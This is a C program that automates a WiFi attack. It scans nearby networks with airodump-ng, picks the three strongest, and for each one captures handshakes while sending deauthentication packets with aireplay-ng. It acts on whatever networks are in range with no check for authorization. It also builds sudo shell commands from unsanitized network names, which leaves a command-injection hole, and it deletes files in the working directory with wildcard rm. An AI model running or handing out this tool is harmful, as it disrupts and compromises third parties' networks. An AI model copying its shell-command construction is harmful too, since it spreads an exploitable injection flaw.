#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_NETWORKS 100
#define LINE_LENGTH 2048
#define MAX_COMMAND_LENGTH 1024
#define MAX_ESSID_LENGTH 100
#define MAX_ENCRYPTION_LENGTH 10
#define MAX_AUTHENTICATION_LENGTH 10
#define MAC_LENGTH 17
#define TOP_NETWORKS 3
#define MAX_TIMEOUT 30

typedef struct 
{
    char essid[MAX_ESSID_LENGTH];
    char bssid[MAC_LENGTH + 1];
    int channel;
    char encryption[MAX_ENCRYPTION_LENGTH];
    char auth[MAX_AUTHENTICATION_LENGTH];
    int power;
} Network;


void alarm_handler(int sig) {
    // This handler will interrupt wait when the alarm signal is received
}

int compare_power(const void* a, const void* b)
{
    const Network* network_a = (const Network*)a;
    const Network* network_b = (const Network*)b;

    return network_b->power - network_a->power;
}

void read_parse(char* filename, Network networks[], int* count)
{
    FILE* file = fopen(filename, "r");
    if (!file)
    {
        perror("Failed to open file");
        exit(-1);
    }

    // A buffer to hold the current line read from the CSV file
    char line[LINE_LENGTH];
    int line_count = 0;
    // Read each line into the buffer until we read the EOF
    while (fgets(line, LINE_LENGTH, file) != NULL)
    {
        line_count++;

        // Skip header lines
        if (line_count <= 2)
        {
            continue;
        }

        // Skip the first two lines and any line not containing expected data
        if (line[0] == '\n' || strstr(line, "Station MAC") != NULL)
        {
            break;
        }

        // Temporary variabes to hold the parsed data
        char tmp_essid[MAX_ESSID_LENGTH] = {0};
        char tmp_bssid[MAC_LENGTH + 1] = {0};
        int tmp_channel;
        char tmp_encryption[MAX_ENCRYPTION_LENGTH] = {0};
        char tmp_authentication[MAX_AUTHENTICATION_LENGTH] = {0};
        int tmp_power;

        // Create formatting string -like a regex to parse the current line
        char format_string[512];

        snprintf(
            format_string, 
            sizeof(format_string), 
            "%%%d[^,], %%*[^,], %%*[^,], %%d, %%*d, %%%d[^,], %%*[^,], %%%d[^,], %%d, %%*d, %%*d, %%*[^,], %%*d, %%%d[^,].", 
            MAC_LENGTH, 
            MAX_ENCRYPTION_LENGTH,
            MAX_AUTHENTICATION_LENGTH,
            MAX_ESSID_LENGTH
        );

        // Use sscanf to parse the current line and deposit the pieces into each of the variables
        int fields_parsed = sscanf(
            line, 
            format_string, 
            tmp_bssid, 
            &tmp_channel, 
            tmp_encryption, 
            tmp_authentication, 
            &tmp_power,
            tmp_essid
        );

        if (tmp_channel == -1 || tmp_essid[0] == '\0' || tmp_power == -1 || strlen(tmp_authentication) < 2) 
        {
            // This entry does not meet our criteria, skip it
            continue;
        }

        // Proceed only if all fields are successfully parsed
        if (fields_parsed == 6) 
        {
            // Create new Network struct and add it to the Networks array if it passes the checks
            if (*count < MAX_NETWORKS) 
            {
                Network new_network;
                new_network.power = tmp_power;
                new_network.channel = tmp_channel;

                strncpy(new_network.essid, tmp_essid, MAX_ESSID_LENGTH - 1);
                new_network.essid[MAX_ESSID_LENGTH - 1] = '\0'; 
                strncpy(new_network.bssid, tmp_bssid, MAC_LENGTH);
                new_network.bssid[MAC_LENGTH] = '\0'; 
                strncpy(new_network.encryption, tmp_encryption, MAX_ENCRYPTION_LENGTH - 1);
                new_network.encryption[MAX_ENCRYPTION_LENGTH - 1] = '\0'; 
                strncpy(new_network.auth, tmp_authentication, MAX_AUTHENTICATION_LENGTH - 1);
                new_network.auth[MAX_AUTHENTICATION_LENGTH - 1] = '\0'; 

                networks[*count] = new_network;
                (*count)++;
            } 
            else 
            {
                // Max number of networks reached and no more will be added
                fprintf(stderr, "Reached maximum network count.\n");
                break;
            }
        } 
        else 
        {
            continue; 
        }

        memset(line, 0, LINE_LENGTH);
    }

    fclose(file);
}

void capture_and_deauth(const char* channel, const char* bssid, const char* essid, const char* interface)
{
    pid_t pid = fork();

    if (pid == 0) // Child process
    {
        // Create command to start capture against current interface
        char caputre_command[MAX_COMMAND_LENGTH];
        snprintf(
            caputre_command, 
            sizeof(caputre_command),
            "sudo airodump-ng -c %s --bssid %s -w %s_capture %s > /dev/null 2>&1",
            channel,
            bssid,
            essid,
            interface
        );
        system(caputre_command);
        exit(0);
    }
    else if (pid > 0) // Parent process
    {
        // Setup signal handler for SIGALRM
        if (signal(SIGALRM, alarm_handler) == SIG_ERR) {
            perror("Failed to set signal handler");
            exit(1);
        }

        sleep(1); // Wait to ensure the capture starts

        char deauth_command[MAX_COMMAND_LENGTH];
        snprintf(deauth_command, sizeof(deauth_command),
                 "sudo aireplay-ng --deauth 10 -a %s %s",
                 bssid, interface);
        system(deauth_command);

        alarm(MAX_TIMEOUT); // Set a 60-second timeout for the child process
        wait(NULL); // Wait for the child process or the alarm
        alarm(0); // Cancel the alarm if we didn't timeout
    }
    else 
    {
        perror("Fork failed");
    }
}

int main(int argc, char* argv[])
{
    // Check the number of arguments given
    if (argc != 3)
    {
        fprintf(stderr, "Usage :%s <duration of scan in seconds> <wireless interface>\n", argv[0]);
        return -1;
    }

    // To hold the address where the strol function stopped processing
    // if the whole string was processed, it should point to the null character
    // otherwise there was a non-numeric character in the string
    char* endptr;

    // Convert string to long in base 10
    long duration = strtol(argv[1], &endptr, 10);

    // Parse the command line arguments and make sure they're valid
    if (*endptr != '\0' || duration <= 0)
    {
        fprintf(stderr, "Please specify a valid scan duration in seconds.\n");
        return -1;
    }

    // Remove any previous capture files before starting the next capture
    system("rm *.csv > /dev/null 2>&1");
    system("rm *.netxml > /dev/null 2>&1");
    system("rm *.cap > /dev/null 2>&1");

    // interface now holds the interface name
    char* interface = argv[2];

    // To hold the command we will execute with call to system()
    char command[MAX_COMMAND_LENGTH];

    // Format string containing our command with command line arguments
    snprintf(
        command, 
        sizeof(command), 
        "sudo timeout %ld airodump-ng -w output --output-format csv %s > /dev/null 2>&1", 
        duration, 
        interface
    );

    // Execute the command
    printf("[i] Scanning for wireless networks ...\n");
    system(command);

    // Process the CSV file
    Network networks[MAX_NETWORKS];
    int network_count = 0;
    read_parse("output-01.csv", networks, &network_count);

    // Sort the network array based on power
    qsort(networks, network_count, sizeof(Network), compare_power);

    // Assuming we have at least one network scanned
    if (network_count > 0) {
        // Create a new array for the top networks
        Network top_networks[TOP_NETWORKS];
        int top_networks_count = network_count < TOP_NETWORKS ? network_count : TOP_NETWORKS;

        for (int i = 0; i < top_networks_count; i++) {
            top_networks[i] = networks[i]; // Copy the top networks
            printf("----> ESSID: %s | BSSID: %s | CHANNEL: %d | POWER: %d\n", top_networks[i].essid, top_networks[i].bssid, top_networks[i].channel, top_networks[i].power);
        }

        // Loop through each network and for each, start a capture on it using its essid as the filename prefix
        // in another thread, start sending de-auth packets to that network
        for (int i = 0; i < top_networks_count; i++)
        {
            // Convert channel to string
            char channel_str[10];
            snprintf(channel_str, sizeof(channel_str), "%d", top_networks[i].channel);

            // Perform the capture and de-auth
            printf("[i] Attacking %s ...\n", top_networks[i].essid);
            capture_and_deauth(channel_str, top_networks[i].bssid, top_networks[i].essid, interface);
        }

    } else {
        printf("No networks found.\n");
    }

    return 0;
}